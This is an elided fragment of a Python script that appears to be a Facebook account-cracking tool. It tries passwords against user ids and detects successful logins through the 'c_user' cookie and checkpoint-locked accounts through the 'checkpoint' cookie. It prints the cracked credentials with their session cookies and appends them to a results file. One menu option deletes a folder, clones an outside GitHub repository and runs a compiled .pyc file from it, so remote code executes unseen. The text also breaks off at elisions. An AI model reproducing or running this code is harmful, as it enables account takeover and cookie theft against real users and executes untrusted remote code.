...
os.system('xdg-open https://t.me/+Dx0MK_GaUV80MzBl')
print(' ')
...
def barie():
    ...
    if opt == '2':
        ...
        return None
    if opt == '1':
    	os.system('rm -rf Murtaza && git clone https://github.com/Barie-khumari/Murtaza && cd Murtaza && python RAKIB _DUMP.pyc')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RAKIB -OK] '+uid+' | '+ps+' \n\033[1;33m COOKIE = \033[1;35m'+coki+  '  ''  \033[0;97m');print(53*'\033[1;37m═')
                open('RAKIB -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[RAKIB -CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m[RAKIB ] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
